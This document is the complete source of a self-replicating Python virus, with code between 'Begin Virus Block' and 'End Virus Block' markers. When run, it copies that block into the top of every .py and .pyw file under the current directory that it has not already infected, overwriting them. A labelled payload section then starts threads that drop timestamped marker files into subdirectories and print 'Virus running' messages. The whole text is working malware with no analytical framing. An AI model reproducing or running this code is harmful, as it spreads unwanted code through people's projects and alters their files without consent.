## Begin Virus Block ##

import sys,glob,threading,os
from datetime import datetime

code = []
with open(sys.argv[0],'r') as f:
	lines = f.readlines()

virus_code = False
for line in lines:
	if line == '## Begin Virus Block ##\n':
		virus_code = True
	if virus_code:
		code.append(line)
	if line == '## End Virus Block ##\n':
		break

python_files = []
for dirpath,_,filenames in os.walk('.'):
	for filename in filenames:
		if filename.endswith('.py') or filename.endswith('.pyw'):
			python_files.append(os.path.join(dirpath,filename))


for python_file in python_files:
	with open(python_file,'r') as f:
		python_file_code = f.readlines()
		

	infected = False
	for line in python_file_code:
		if line == '## Begin Virus Block ##\n':
			infected = True
			break
	if not infected:
		infected_code = []
		infected_code.extend(code)
		infected_code.extend('\n')
		infected_code.extend(python_file_code)

		with open(python_file,'w') as f:
			f.writelines(infected_code)


## Malicious Payload #####
def Payload1(st):
	sub_dirs = glob.glob("*/")
	for sub_dir in sub_dirs:
		file_ = str(datetime.now().strftime("%Y%m%d-%H%M%S"))+'.txt'
		file = os.path.join(sub_dir,file_)
		with open(file,'w') as f:
			f.writelines("Virus "+st+" running.....")
	#print("Virus "+st+" running.....")

	

def Payload2(st):
	print("Virus "+st+" running.....")
	#os.system('touch virus2.txt')

th1 = threading.Thread(target=Payload1,args=('thread1',))
th2 = threading.Thread(target=Payload2,args=('thread2(Main virus file)',))

th1.start()
th2.start()
th1.join()
th2.join()

## End Virus Block ##


